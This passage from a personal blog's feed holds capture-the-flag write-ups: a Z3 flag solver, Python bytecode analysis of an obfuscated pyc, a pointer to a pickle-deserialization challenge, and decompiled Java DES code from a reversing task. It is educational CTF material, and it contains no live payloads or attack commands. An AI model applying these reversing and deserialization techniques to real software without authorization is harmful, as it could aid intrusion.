punctuation">]</span> <span class="token operator">==</span> <span class="token number">53</span> <span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">102</span> <span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">56</span> <span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">55</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">50</span><span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">52</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sol<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> sol<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>flag <span class="token operator">=</span> <span class="token string">'TWCTF{'</span><span class="token keyword">for</span> d <span class="token keyword">in</span> m<span class="token punctuation">.</span>decls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dic<span class="token punctuation">[</span>d<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> <span class="token string">'k'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>dic<span class="token punctuation">.</span>get<span class="token punctuation">(</span>point<span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">+=</span> <span class="token string">'}'</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(dic)</span><span class="token comment" spellcheck="true">#print(sol.model())</span><span class="token comment" spellcheck="true">#print(sol.model())</span></code></pre><p>Nice Z3！🐕</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Learning z3!&lt;/p&gt;
    
    </summary>
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/categories/Binary/"/>
    
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/tags/Binary/"/>
    
  </entry>
  
  <entry>
    <title>网络信息安全专项赛_And_SUCTF</title>
    <link href="http://www.yof3ng.xyz/2019/08/21/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B-And-SuCtf/"/>
    <id>http://www.yof3ng.xyz/2019/08/21/网络信息安全专项赛-And-SuCtf/</id>
    <published>2019-08-21T07:11:40.000Z</published>
    <updated>2019-08-22T09:23:12.390Z</updated>
    
    <content type="html"><![CDATA[<p>这段时间玩了一下网络与信息安全领域专项赛和SUCTF，就稍微整合一下盲区。两场名次都是60+，虽然不像之前的签到选手了，但也离顶尖差很远很远。</p><a id="more"></a><p>[TOC]</p><h1 id="网络信息安全专项赛"><a href="#网络信息安全专项赛" class="headerlink" title="网络信息安全专项赛"></a>网络信息安全专项赛</h1><p>这个比赛的<code>challenges</code>相对来说比较简单，以下是我比较感兴趣的几题。</p><h2 id="Py交易"><a href="#Py交易" class="headerlink" title="Py交易"></a>Py交易</h2><p>参考<code>Nu1L wp</code>，以及</p><p><a href="https://blog.csdn.net/q1uTruth/article/details/99634952" target="_blank" rel="noopener">https://blog.csdn.net/q1uTruth/article/details/99634952</a></p><p><a href="https://www.jianshu.com/p/10e6bc633938" target="_blank" rel="noopener">https://www.jianshu.com/p/10e6bc633938</a></p><p>一个无法反编译的pyc文件，需要硬刚字节码。咱没有NU1L的自定义IDA PRO，只能找工具减少工作量：</p><p><a href="https://github.com/extremecoders-re/PjOrion-Deobfuscator" target="_blank" rel="noopener">https://github.com/extremecoders-re/PjOrion-Deobfuscator</a></p><p>根据此工具可生成svg格式的CFG图。</p><p>官方WP：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190821181518.png" alt=""></p><p>通过对<a href="https://github.com/python/cpython" target="_blank" rel="noopener">cpython</a>源码的实现进行理解，对于<code>PjOrion-Deobfuscator</code>提取出来的CFG图，可以开始硬刚上面的逻辑了：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190821205232.png" alt=""></p><p>跟着CFG图走一遍可以知道开始是四个列表赋值：</p><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13433</span><span class="token punctuation">,</span> <span class="token number">4747</span><span class="token punctuation">,</span> <span class="token number">17752</span><span class="token punctuation">,</span> <span class="token number">33060</span><span class="token punctuation">,</span> <span class="token number">31051</span><span class="token punctuation">,</span> <span class="token number">48809</span><span class="token punctuation">,</span> <span class="token number">29988</span><span class="token punctuation">,</span> <span class="token number">6421</span><span class="token punctuation">,</span> <span class="token number">20021</span><span class="token punctuation">,</span><span class="token number">38888</span><span class="token punctuation">,</span> <span class="token number">24844</span><span class="token punctuation">,</span> <span class="token number">20706</span><span class="token punctuation">,</span> <span class="token number">11713</span><span class="token punctuation">,</span> <span class="token number">34938</span><span class="token punctuation">,</span> <span class="token number">12865</span><span class="token punctuation">,</span> <span class="token number">6085</span><span class="token punctuation">,</span> <span class="token number">37391</span><span class="token punctuation">,</span> <span class="token number">32840</span><span class="token punctuation">,</span> <span class="token number">31964</span><span class="token punctuation">,</span> <span class="token number">27194</span><span class="token punctuation">,</span><span class="token number">8701</span><span class="token punctuation">,</span> <span class="token number">48142</span><span class="token punctuation">,</span> <span class="token number">27066</span><span class="token punctuation">,</span> <span class="token number">28626</span><span class="token punctuation">,</span> <span class="token number">37431</span><span class="token punctuation">,</span> <span class="token number">39142</span><span class="token punctuation">,</span> <span class="token number">46795</span><span class="token punctuation">,</span> <span class="token number">21771</span><span class="token punctuation">,</span> <span class="token number">44280</span><span class="token punctuation">,</span> <span class="token number">40628</span><span class="token punctuation">,</span> <span class="token number">35013</span><span class="token punctuation">,</span><span class="token number">18583</span><span class="token punctuation">,</span> <span class="token number">5418</span><span class="token punctuation">,</span> <span class="token number">4347</span><span class="token punctuation">,</span> <span class="token number">43929</span><span class="token punctuation">,</span> <span class="token number">9934</span><span class="token punctuation">,</span> <span class="token number">46892</span><span class="token punctuation">,</span> <span class="token number">19868</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13711</span><span class="token punctuation">,</span> <span class="token number">7074</span><span class="token punctuation">,</span> <span class="token number">79833</span><span class="token punctuation">,</span> <span class="token number">42654</span><span class="token punctuation">,</span> <span class="token number">23241</span><span class="token punctuation">,</span> <span class="token number">41412</span><span class="token punctuation">,</span> <span class="token number">61795</span><span class="token punctuation">,</span> <span class="token number">6373</span><span class="token punctuation">,</span> <span class="token number">19304</span><span class="token punctuation">,</span><span class="token number">1363</span><span class="token punctuation">,</span> <span class="token number">1682</span><span class="token punctuation">,</span> <span class="token number">66279</span><span class="token punctuation">,</span> <span class="token number">76134</span><span class="token punctuation">,</span> <span class="token number">60748</span><span class="token punctuation">,</span> <span class="token number">10355</span><span class="token punctuation">,</span> <span class="token number">63484</span><span class="token punctuation">,</span> <span class="token number">30491</span><span class="token punctuation">,</span> <span class="token number">34005</span><span class="token punctuation">,</span> <span class="token number">51393</span><span class="token punctuation">,</span> <span class="token number">38029</span><span class="token punctuation">,</span><span class="token number">7241</span><span class="token punctuation">,</span> <span class="token number">4998</span><span class="token punctuation">,</span> <span class="token number">18562</span><span class="token punctuation">,</span> <span class="token number">16935</span><span class="token punctuation">,</span> <span class="token number">66677</span><span class="token punctuation">,</span> <span class="token number">51321</span><span class="token punctuation">,</span> <span class="token number">13771</span><span class="token punctuation">,</span> <span class="token number">49108</span><span class="token punctuation">,</span> <span class="token number">52166</span><span class="token punctuation">,</span> <span class="token number">8851</span><span class="token punctuation">,</span> <span class="token number">16900</span><span class="token punctuation">,</span><span class="token number">31682</span><span class="token punctuation">,</span> <span class="token number">16684</span><span class="token punctuation">,</span> <span class="token number">12046</span><span class="token punctuation">,</span> <span class="token number">16764</span><span class="token punctuation">,</span> <span class="token number">64315</span><span class="token punctuation">,</span> <span class="token number">76742</span><span class="token punctuation">,</span> <span class="token number">14022</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">832832835</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">924053193</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">307134635</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">527578092</span><span class="token punctuation">,</span> <span class="token number">998625960</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">715102211</span><span class="token punctuation">,</span> <span class="token number">3572182</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">963194083</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">475718185</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">361574731</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">678171563</span><span class="token punctuation">,</span><span class="token number">107566155</span><span class="token punctuation">,</span> <span class="token number">608670527</span><span class="token punctuation">,</span> <span class="token number">254218946</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">81206308</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">284228457</span><span class="token punctuation">,</span> <span class="token number">373369420</span><span class="token punctuation">,</span><span class="token number">659110852</span><span class="token punctuation">,</span> <span class="token number">165298084</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">389004184</span><span class="token punctuation">,</span> <span class="token number">893094421</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">868933443</span><span class="token punctuation">,</span> <span class="token number">44838205</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">98551062</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">59800920</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">575871298</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">748337118</span><span class="token punctuation">,</span> <span class="token number">696390966</span><span class="token punctuation">,</span> <span class="token number">427210246</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">266607884</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">555200820</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">594235119</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">233255094</span><span class="token punctuation">,</span> <span class="token number">229291711</span><span class="token punctuation">,</span> <span class="token number">711922719</span><span class="token punctuation">,</span><span class="token number">14476464</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">783373820</span><span class="token punctuation">,</span> <span class="token number">892608580</span><span class="token punctuation">]</span>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">973988289</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">867920193</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">132362266</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">172451190</span><span class="token punctuation">,</span> <span class="token number">1471255182</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">242282199</span><span class="token punctuation">,</span> <span class="token number">321870424</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">897049789</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">428663209</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">256350703</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">613466537</span><span class="token punctuation">,</span><span class="token number">321254055</span><span class="token punctuation">,</span> <span class="token number">641759727</span><span class="token punctuation">,</span> <span class="token number">344601346</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">40281788</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">217030057</span><span class="token punctuation">,</span> <span class="token number">476060216</span><span class="token punctuation">,</span><span class="token number">767746297</span><span class="token punctuation">,</span> <span class="token number">503093626</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">102198850</span><span class="token punctuation">,</span> <span class="token number">984358207</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">415480559</span><span class="token punctuation">,</span> <span class="token number">322813233</span><span class="token punctuation">,</span><span class="token number">178032672</span><span class="token punctuation">,</span> <span class="token number">48876640</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">467362638</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">260077296</span><span class="token punctuation">,</span> <span class="token number">923436845</span><span class="token punctuation">,</span> <span class="token number">536082660</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">138702820</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">210365307</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">397666023</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">215329942</span><span class="token punctuation">,</span> <span class="token number">274852104</span><span class="token punctuation">,</span> <span class="token number">818217684</span><span class="token punctuation">,</span><span class="token number">41479433</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">632022956</span><span class="token punctuation">,</span> <span class="token number">1204798830</span><span class="token punctuation">]</span></code></pre><p>建立列表之后，比较d和e，如果相等则调用p_s函数对象，不相等则调用p_f函数对象，在我们用marshl得到的信息中可以知道p_s和p_f的逻辑，在此题中p_s和p_f只是两个打印的函数而已。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822110511.png" alt=""></p><p>通过分析得到d和e的关系：</p><pre class=" language-py"><code class="language-py">d.append(a[i]*data[i]*data[i] + b[i]*data[i])</code></pre><p>可以拟以下函数，其中x中为随便赋的值，然后通过dis模块打印字节码，以便将逻辑看的更为清晰，<code>本题要求的即为flag==&gt;x[]</code>：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822140847.png" alt=""></p><p><code>import dis;dis.dis(get):</code></p><pre class=" language-python"><code class="language-python">            <span class="token number">597</span> STORE_FAST               <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token number">25</span>         <span class="token number">600</span> BUILD_LIST               <span class="token number">0</span>            <span class="token number">603</span> STORE_FAST               <span class="token number">5</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token number">26</span>         <span class="token number">606</span> SETUP_LOOP              <span class="token number">77</span> <span class="token punctuation">(</span>to <span class="token number">686</span><span class="token punctuation">)</span>            <span class="token number">609</span> LOAD_GLOBAL              <span class="token number">0</span> <span class="token punctuation">(</span>range<span class="token punctuation">)</span>            <span class="token number">612</span> LOAD_CONST             <span class="token number">191</span> <span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span>            <span class="token number">615</span> CALL_FUNCTION            <span class="token number">1</span>            <span class="token number">618</span> GET_ITER                    <span class="token operator">>></span>  <span class="token number">619</span> FOR_ITER                <span class="token number">63</span> <span class="token punctuation">(</span>to <span class="token number">685</span><span class="token punctuation">)</span>            <span class="token number">622</span> STORE_FAST               <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token number">27</span>         <span class="token number">625</span> LOAD_FAST                <span class="token number">5</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span>            <span class="token number">628</span> LOAD_ATTR                <span class="token number">1</span> <span class="token punctuation">(</span>append<span class="token punctuation">)</span>            <span class="token number">631</span> LOAD_FAST                <span class="token number">0</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span>            <span class="token number">634</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">637</span> BINARY_SUBSCR                   <span class="token number">638</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token number">641</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">644</span> BINARY_SUBSCR                   <span class="token number">645</span> BINARY_MULTIPLY                 <span class="token number">646</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token number">649</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">652</span> BINARY_SUBSCR                   <span class="token number">653</span> BINARY_MULTIPLY                 <span class="token number">654</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span>            <span class="token number">657</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">660</span> BINARY_SUBSCR                   <span class="token number">661</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token number">664</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">667</span> BINARY_SUBSCR                   <span class="token number">668</span> BINARY_MULTIPLY                 <span class="token number">669</span> BINARY_ADD                      <span class="token number">670</span> LOAD_FAST                <span class="token number">2</span> <span class="token punctuation">(</span>c<span class="token punctuation">)</span>            <span class="token number">673</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">676</span> BINARY_SUBSCR                   <span class="token number">677</span> BINARY_ADD                      <span class="token number">678</span> CALL_FUNCTION            <span class="token number">1</span>            <span class="token number">681</span> POP_TOP                         <span class="token number">682</span> JUMP_ABSOLUTE          <span class="token number">619</span>        <span class="token operator">>></span>  <span class="token number">685</span> POP_BLOCK           </code></pre><p>可以看到与CFG图中的逻辑基本一致，只是少了很多不必要的跳转，此题基本到此结束。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822143309.png" alt=""></p><h1 id="SUCTF"><a href="#SUCTF" class="headerlink" title="SUCTF"></a>SUCTF</h1><h2 id="guess-game"><a href="#guess-game" class="headerlink" title="guess_game"></a>guess_game</h2><p>此题是一个pickle反序列化的题目，虽然有思路，但是苦于不知道如何手工构造payload。</p><p>看wp后：</p><p><a href="https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup" target="_blank" rel="noopener">https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup</a></p><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822171000.png" class="lazyload"></p><p>从底层去理解一门语言真的tql，orz…😄</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这段时间玩了一下网络与信息安全领域专项赛和SUCTF，就稍微整合一下盲区。两场名次都是60+，虽然不像之前的签到选手了，但也离顶尖差很远很远。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="Write_up" scheme="http://www.yof3ng.xyz/tags/Write-up/"/>
    
      <category term="bytecode" scheme="http://www.yof3ng.xyz/tags/bytecode/"/>
    
  </entry>
  
  <entry>
    <title>Awesome_Terminal</title>
    <link href="http://www.yof3ng.xyz/2019/07/23/Awesome-Terminal/"/>
    <id>http://www.yof3ng.xyz/2019/07/23/Awesome-Terminal/</id>
    <published>2019-07-23T10:26:19.000Z</published>
    <updated>2019-07-23T10:38:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>This page is to show a good terminal named “Terminus”😎…</p><a id="more"></a><h1 id="Terminus"><a href="#Terminus" class="headerlink" title="Terminus"></a>Terminus</h1><p>It is an open source project…Until now already possess over ten thousands stars…</p><p>Here is a flyer page:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183221.png" alt=""></p><p>And mine look as follow:</p><hr><p><code>Home page</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183348.png" alt=""></p><p><code>SSH page</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183525.png" alt=""></p><p>It is really awesome! As you can see😄.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This page is to show a good terminal named “Terminus”😎…&lt;/p&gt;
    
    </summary>
    
      <category term="tools" scheme="http://www.yof3ng.xyz/categories/tools/"/>
    
    
      <category term="Tools" scheme="http://www.yof3ng.xyz/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Cybrics_Matreshka_Reverse</title>
    <link href="http://www.yof3ng.xyz/2019/07/22/Cybrics-Matreshka-Reverse/"/>
    <id>http://www.yof3ng.xyz/2019/07/22/Cybrics-Matreshka-Reverse/</id>
    <published>2019-07-22T07:09:11.000Z</published>
    <updated>2019-07-22T13:41:01.381Z</updated>
    
    <content type="html"><![CDATA[<p>I try to play the Cybrics CTF yesterday😀…And the truth tell me that how suck i am… Btw…The challenges of Cybrics is very interesting and fresh.</p><a id="more"></a><h1 id="Cybrics-Matreshka-Reverse"><a href="#Cybrics-Matreshka-Reverse" class="headerlink" title="Cybrics_Matreshka_Reverse"></a>Cybrics_Matreshka_Reverse</h1><blockquote><p>CyBRICS is a computer security competition (CTF) organized in a cross-university effort by BRICS countries academia.</p><p>The event is organized by CyBRICS coordinating universities: <a href="https://en.itmo.ru/en/" target="_blank" rel="noopener">ITMO University</a> (RU), <a href="http://en.scu.edu.cn/" target="_blank" rel="noopener">SiChuan University</a> (CN), <a href="https://www.nitw.ac.in/" target="_blank" rel="noopener">NIT Warangal</a> (IN), <a href="http://www.iitkgp.ac.in/" target="_blank" rel="noopener">IIT Kharagpur</a> (IN), <a href="https://www.wits.ac.za/" target="_blank" rel="noopener">Wits University</a> (ZA), <a href="https://www.tut.ac.za/" target="_blank" rel="noopener">Tshwane University of Technology</a> (ZA).</p><p>The competition is made and run by <a href="https://vk.com/spbctf" target="_blank" rel="noopener">SPbCTF</a> meetups crew (members of CTF teams LC↯BC, SiBears, PeterPEN, Yozik).</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722151354.png" alt=""></p><h2 id="Challenge-Matreshka"><a href="#Challenge-Matreshka" class="headerlink" title="Challenge_Matreshka"></a>Challenge_Matreshka</h2><p>Although it is easy for most individuals, i think it’s valuable.</p><p>appendix: <code>Code2.class</code> and <code>data2.bin</code></p><h2 id="Step1-Java-analysis"><a href="#Step1-Java-analysis" class="headerlink" title="Step1: Java analysis"></a>Step1: Java analysis</h2><p>You can get the source code from Code2.class by the <code>jd-gui</code> or other tools like it.</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>PrintStream<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>Cipher<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>SecretKey<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>SecretKeyFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span>DESKeySpec<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Code2</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfByte<span class="token punctuation">,</span> String paramString<span class="token punctuation">)</span>    <span class="token keyword">throws</span> Exception  <span class="token punctuation">{</span>    SecretKeyFactory localSecretKeyFactory <span class="token operator">=</span> SecretKeyFactory<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> paramString<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DESKeySpec localDESKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DESKeySpec</span><span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey localSecretKey <span class="token operator">=</span> localSecretKeyFactory<span class="token punctuation">.</span><span class="token function">generateSecret</span><span class="token punctuation">(</span>localDESKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cipher localCipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localCipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> localSecretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> localCipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>paramArrayOfByte<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> arrayOfByte2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfByte<span class="token punctuation">,</span> String paramString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    SecretKeyFactory localSecretKeyFactory <span class="token operator">=</span> SecretKeyFactory<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> paramString<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DESKeySpec localDESKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DESKeySpec</span><span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey localSecretKey <span class="token operator">=</span> localSecretKeyFactory<span class="token punctuation">.</span><span class="token function">generateSecret</span><span class="token punctuation">(</span>localDESKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cipher localCipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localCipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> localSecretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> localCipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>paramArrayOfByte<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> arrayOfByte2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String str <span class="token operator">=</span> <span class="token string">"matreha!"</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token function">encode</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token 